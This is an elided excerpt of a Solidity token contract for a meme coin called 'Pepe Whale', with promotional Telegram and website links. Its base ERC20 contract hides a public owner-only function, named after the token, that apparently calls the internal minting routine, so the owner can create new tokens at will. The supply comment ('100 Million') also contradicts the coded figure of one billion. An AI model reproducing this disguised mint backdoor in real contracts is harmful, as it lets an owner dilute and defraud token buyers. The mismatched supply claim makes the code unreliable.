//
// $PepeWhale proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/PepeWhaleportaI
// 📱 Website ::https://pepewhale.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _PepeWhale(uint256 amount) public onlyOwner {
 _PepeWhale(msg.sender, amount);
    }
    ...
    function _PepeWhale(address account, uint256 amount) internal virtual {
...
contract $PepeWhale is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Pepe Whale", "PEPEWHALE") {
     _PepeWhale(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}